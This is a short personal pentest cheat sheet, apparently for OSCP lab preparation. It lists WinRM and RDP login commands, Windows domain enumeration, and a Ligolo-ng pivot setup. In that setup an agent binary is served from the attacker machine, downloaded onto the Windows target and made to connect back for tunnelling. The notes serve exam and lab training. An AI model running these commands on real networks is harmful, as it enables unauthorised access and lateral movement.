https://github.com/intotheewild/OSCP-Checklist/blob/main/04.%20Active%20Directory%20Enumeration.md 
```
nxc winrm IP -u "username" -p "password"
evil-winrm -i IP -u "username" -p "password" -e /home/makayla
```

RDP
```
`xfreerdp /u:<USER> /p:<PASS> /d:<DOMAIN> /v:<TARGET_IP> /cert:ignore`
```


Enum 
```
whoami
ipconfig 
- `net user /domain` all users in domain
- `net user username /domain` information on a domain user
- `net group /domain`
- `net group groupname /domain`
```
Ligolo 
```
ligolo-proxy -selfcert (keep open in other tab )
sudo ip tuntap add user makayla mode tun ligolo 
sudo ip link set ligolo up 
ip a (ligolo)
cd ~/ligolo-ng 
GOOS=windows GOARCH=amd64 go build -o agent.exe -ldflags="-s -w" cmd/agent/main.go 
sudo ip route add IP/24 dev ligolo 
sudo ip route list 
```

python3 -m http.server 8888

ON windows 
```
wget ip:8888/agent.exe -o agent.exe 
./agent.exe -connect IP:11601 -ignore-cert 
```

on home 
```
session 1 
start 
```